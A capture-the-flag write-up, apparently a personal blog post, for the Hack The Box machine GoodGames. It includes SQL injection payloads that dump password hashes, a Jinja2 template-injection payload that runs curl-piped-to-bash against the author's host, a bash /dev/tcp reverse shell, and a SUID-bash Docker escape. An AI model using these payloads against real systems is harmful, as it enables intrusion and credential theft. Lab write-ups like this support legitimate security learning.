# HTB - GoodGames

#### Ip: 10.10.11.158
#### Name: GoodGames
#### Rating: Easy

----------------------------------------------------------------------

GoodGames.png

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/GoodGames]
└─$ sudo nmap -p- -sC -sV --min-rate=10000 10.129.96.71 
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-23 12:43 CDT
Nmap scan report for 10.129.96.71
Host is up (0.076s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.31 seconds
```

Let's add goodgames.htb to `/etc/hosts`.

Looking at port 80 we find a site about video games:

htb_goodgames_site.png

### Exploitation

After poking around the site and not finding much of interest, I began testing the `/login` page and discovered that the email field is vulnerable to SQL injection:

htb_goodgames_test.png

Further testing reveals there are 4 columns:

htb_goodgames_4.png

We can see the database is `main`:

htb_goodgames_main.png

Let's look at the tables:

```
'+UNION+SELECT+1,2,3,group_concat(table_schema,+'%3a'+,table_name)+FROM+information_schema.tables+WHERE+table_schema+!%3d+'mysql'+AND+table_schema+!%3d+'information_schema'--+-
```

htb_goodgames_tables.png

We can now see the columns:

htb_goodgames_columns.png

name and password seem interesting.

We can grab those with:

```
'+UNION+SELECT+1,2,3,group_concat(name,+'%3a'+,password)+FROM+main.user+--+-
```

htb_goodgames_hash.png

Here we find the admin hash, as well as all the test user accounts I created during my initial testing.

We can crack the admin hash using crackstation:

htb_goodgames_crack.png

`admin:superadministrator`

Lets login using `admin@goodgames.htb`.

htb_goodgames_in.png

Still not seeing much of interest now that we are logged in as admin, I checked the page source and found a new endpoint:

htb_goodgames_internal.png

Let's add internal-administration.goodgames.htb to `/etc/hosts` as well.

htb_goodgames_login2.png

Let's logging using the same credentials we discovered via SQLI:

htb_goodgames_in2.png

Poking around, the internal site is largely static, but after a while I discovered an SSTI vulnerability in the admin profile page:

htb_goodgames_ssti.png

Let's use this to run the `id` command:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

htb_goodgames_id.png

Let's exploit this for a reverse shell. For this step I found a helpful site at: https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/

First I'll create a simple bash reverse shell file:

```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.115/9001 0>&1"
```

Then I will set up a python server and netcat listener, and use the SSTI to fetch the shell from my kali box:

```
name={{request.application.__globals__.__builtins__.__import__('os').popen('curl+10.10.14.115%3a8888/revshell.sh+|+bash').read()}}
```

This catches me a shell back:

```
┌──(ryan㉿kali)-[~/HTB/GoodGames]
└─$ nc -lnvp 9001                
listening on [any] 9001 ...
connect to [10.10.14.115] from (UNKNOWN) [10.129.96.71] 46894
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# whoami
whoami
root
root@3a453ab39d3d:/backend# hostname
hostname
3a453ab39d3d
```

This seems to be a docker container, but let's go ahead and grab the user.txt flag:

htb_goodgames_user.png

### Privilege Escalation

Running `ip a` we find what is likely the host machine's network range:

```
root@3a453ab39d3d:/tmp# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Let's do a quick ping sweep of this:

```
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" &); done;
```

```
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.078 ms
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.083 ms
```

We can copy over an nmap binary and do a port scan:

```
root@3a453ab39d3d:/tmp# ./nmap_binary 172.19.0.1    

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-07-23 21:16 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.19.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000025s latency).
Not shown: 1205 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:88:2E:70:49 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 14.58 seconds
```

Note: You can also do this natively with bash with:

```
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
```

Cool, so looks like SSH is open on the host.

Trying out the user augustus with the `superadministrator` credential we discovered earlier, we drop into a new shell.

```
root@3a453ab39d3d:/tmp# ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ whoami
augustus
augustus@GoodGames:~$ hostname
GoodGames
```

Nice.

After playing around awhile I found that whatever files are created on goodgames via the SSH session are also present in docker:

```
augustus@GoodGames:~$ echo 'hi' > test.txt
augustus@GoodGames:~$ ls
test.txt  user.txt
augustus@GoodGames:~$ cat test.txt
hi
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.
root@3a453ab39d3d:/tmp# cd /home/augustus 
root@3a453ab39d3d:/home/augustus# ls -la
total 28
drwxr-xr-x 2 1000 1000 4096 Jul 23 21:23 .
drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root    9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000 3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000  807 Oct 19  2021 .profile
-rw-r--r-- 1 1000 1000    3 Jul 23 21:23 test.txt
-rw-r----- 1 root 1000   33 Jul 23 17:42 user.txt
```

Let's copy over `/bin/bash` in the SSH session:

```
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ ls
bash  test.txt  user.txt
```

Then we can head back to Docker:

```
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.
root@3a453ab39d3d:/home/augustus# ls
bash  test.txt	user.txt
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod 4777 bash
```

And finally log back in via SSH:

```
augustus@GoodGames:~$ ls
bash  test.txt  user.txt
augustus@GoodGames:~$ ./bash -p
bash-5.0# whoami
root
bash-5.0# hostname
GoodGames
```

We can now grab the final flag:

htb_goodgames_root.png

Thanks for following along!

-Ryan

------------------------------------------